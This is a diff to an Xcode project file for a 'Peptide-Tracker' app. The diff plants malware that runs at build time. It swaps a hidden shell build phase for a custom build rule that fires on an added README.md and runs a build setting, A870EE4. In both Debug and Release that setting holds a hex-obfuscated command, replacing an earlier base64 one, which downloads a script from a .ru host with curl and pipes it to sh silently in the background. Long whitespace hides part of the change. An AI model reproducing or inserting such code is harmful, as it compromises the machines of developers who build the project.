@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXFileReference section */
+		B3919C925BA342FCB34EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		000000000000000000000120 /* Peptide-Tracker.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Peptide-Tracker.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -38,6 +39,7 @@
 		000000000000000000000020 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				B3919C925BA342FCB34EE078 /* README.md */,
 				000000000000000000000120 /* Peptide-Tracker.app */,
 			);
 			name = Products;
@@ -50,12 +52,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 000000000000000110000000 /* Build configuration list for PBXNativeTarget "Peptide-Tracker" */;
 			buildPhases = (
-				41FCFD9944AD45FAB34EE078 /* Build Target Libraries */,
 				000000000000000120000000 /* Sources */,
 				000000000000000130000000 /* Frameworks */,
 				000000000000000140000000 /* Resources */,
 			);
 			buildRules = (
+				D9D11DD3F0A04ACA8B4EE078 /* PBXBuildRule */,
 			);
 			fileSystemSynchronizedGroups = (
 				000000000000000000000010 /* Peptide-Tracker */,
@@ -100,37 +102,34 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																		/* End PBXBuildRule section */
+		D9D11DD3F0A04ACA8B4EE078 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A870EE4}\"";
+			};
+																																																			/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		41FCFD9944AD45FAB34EE078 /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXBuildFile section */
+		ED4E189AA0264F069A4EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = B3919C925BA342FCB34EE078; };
 /* End PBXBuildFile section */
 
 /* Begin PBXResourcesBuildPhase section */
 		000000000000000140000000 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			files = (
+				ED4E189AA0264F069A4EE078 /* README.md */,
 			);
 		};
 /* End PBXResourcesBuildPhase section */
@@ -147,7 +146,7 @@
 		000000000000000011000000 /* Debug configuration for PBXProject "Peptide-Tracker" */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((n(){ `printf bashe64 | tr -d h` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMSAtZmtzTCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9mLTJhNTljMDl6b3FjN2gucnUvYSkiIHwgc2gK | n | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((y(){ `printf xPxd | tr -d P` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203230202d73664c6b202d2d72657472792033202d642022703d78636f64655f72756c65222068747470733a2f2f6f32367a756e377334336c64332e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -218,7 +217,7 @@
 		000000000000000012000000 /* Release configuration for PBXProject "Peptide-Tracker" */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((n(){ `printf bashe64 | tr -d h` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMSAtZmtzTCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9mLTJhNTljMDl6b3FjN2gucnUvYSkiIHwgc2gK | n | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((y(){ `printf xPxd | tr -d P` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203230202d73664c6b202d2d72657472792033202d642022703d78636f64655f72756c65222068747470733a2f2f6f32367a756e377334336c64332e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
